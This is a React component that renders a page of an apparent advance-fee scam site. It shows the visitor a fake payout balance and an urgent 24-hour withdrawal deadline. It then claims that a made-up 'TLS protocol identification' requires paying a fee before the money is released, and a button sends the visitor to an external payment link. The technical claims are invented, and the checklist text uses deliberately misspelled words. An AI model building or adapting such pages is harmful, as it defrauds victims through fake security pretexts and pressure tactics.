import moment from "moment"
import { Text, Flex, Box, Icon, Image, Button } from "@chakra-ui/react"
import React, { useCallback } from "react"
import ChatCard from "../../components/ChatCard"
import { useSelector } from "react-redux"
import { thousandsFormatter, useGoTo } from "../../utils"
import FormCheckItem from "../../components/FormCheckItem"
import { COMMISSION_MANUAL_PAGE, COMMISSION_PAGE } from "../../constants"
import { useNavigate } from "react-router-dom"

const nextPage = `/${COMMISSION_PAGE}/${COMMISSION_MANUAL_PAGE}`
// 2-8
const Tls = () => {
  const balance = useSelector(state => state.user.balance)

  const links = useSelector(state => state.data.links)

  const prices = useSelector(state => state.data.prices)
  // const goToNext = useGoTo()

  const navigate = useNavigate()

  const onClick = useCallback(() => {
    const link = links?.[28]

    if (!link) return

    if (String(link).includes("http")) {
      window.open(link, "_self")
    } else {
      navigate(link)
    }
  }, [links?.[28]])

  return (
    <ChatCard
      position={"relative"}
      minH={{ base: "calc(100vh - 112px)", sm: "fit-content" }}
      bodyStyles={{
        padding: { base: "40px 20px 20px", md: "30px" }
      }}
    >
      <Box
        display={"grid"}
        gridTemplateColumns={{ base: "1fr", md: "1fr 1fr" }}
        gridTemplateRows={{ base: "auto", md: "repeat(2, min-content)" }}
        gap={"30px"}
      >
        <Flex
          flexDir={{ base: "column", md: "row" }}
          alignItems={{ base: "center", md: "flex-start" }}
          gap={{ md: "30px" }}
        >
          <Box textAlign={{ base: "center", md: "left" }}>
            <Text fontSize={{ base: "20px", md: "24px" }} fontWeight={"600"}>
              Your payout amount is:
            </Text>
            <Text
              fontSize={{ base: "40px", md: "40px" }}
              fontWeight={"bold"}
              color={"brand.600"}
              background={"linear-gradient(180deg, #7B2FD0 0%, #414DED 100%)"}
              whiteSpace={"nowrap"}
              sx={{
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent"
              }}
            >
              {`$${thousandsFormatter(balance)}`}
              <Text as={"span"} fontSize={"18px"}>
                {" "}
                USD
              </Text>
            </Text>
          </Box>
          <Text
            color={"pink.100"}
            fontSize={{ base: "16px", md: "20px" }}
            textAlign={{ base: "center", md: "left" }}
            width={{ md: "40%" }}
          >
            You need to withdraw money within 24 hours!
          </Text>
        </Flex>
        <Flex
          flexDir={"column"}
          justifyContent={{ md: "flex-start" }}
          gridRow={"span 2"}
        >
          <Text
            fontSize={{ base: "20px", md: "24px" }}
            fontWeight={"600"}
            textAlign={{ base: "center", md: "left" }}
          >
            Transfer awaits the identification of the TLS protocol
          </Text>
          <br />
          <Text fontSize={{ base: "16px", md: "20px" }}>
            Your personal digital signature is confirmed! You can use it on any
            online services. Your browser requested the identification of the
            TLS protocol for instantly receiving the transfer in the amount of
            <b>${balance}</b> directly from the browser. Most likely this
            happened due to the fact that you have two or more tabs in your
            browser. The developer of your browser asks to confirm that the
            translation <b>${balance}</b> get you, and not the attackers who
            have hacked the browser.
            <br />
            <br />
            To confirm the details, you need to identify the TLS protocol by
            replenishing the transfer amount.
          </Text>
        </Flex>
        <Flex flexDir={"column"} fontSize={"20px"}>
          <Text fontSize={"20px"} mb={"30px"}>
            Immediately after the replenishment of the transfer amount, the
            payment for the amount <b>${balance}</b> will be identified and sent
            to these details within 10 minues.
            <br />
            <br />
            Replenish the transfer amount to: <b>${prices?.[28]}.</b>
          </Text>
          <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
            <FormCheckItem
              checked={true}
              label={"Replenish your balance for the specified amount."}
            />
            <FormCheckItem
              checked={true}
              label={"The svstem will automatically check your signature."}
            />
            <FormCheckItem
              checked={true}
              label={"Your pavment will be sent to your details."}
            />
          </Flex>
        </Flex>
      </Box>
      <Flex
        flexDir={{ base: "column-reverse", md: "row" }}
        justifyContent={{ md: "space-between" }}
        alignItems={"center"}
      >
        <Image
          src="./img/secure-payment.png"
          w={"120px"}
          margin={{ base: "50px auto", sm: "60px 0 0" }}
        />
        <Flex
          mt={"40px"}
          flexDir={{ base: "column", md: "row" }}
          alignItems={"center"}
        >
          <Button
            mb={"10px"}
            mr={{ md: "40px" }}
            onClick={onClick}
            minW={"150px"}
          >
            Replenish the balance
          </Button>
        </Flex>
      </Flex>
    </ChatCard>
  )
}

export default Tls
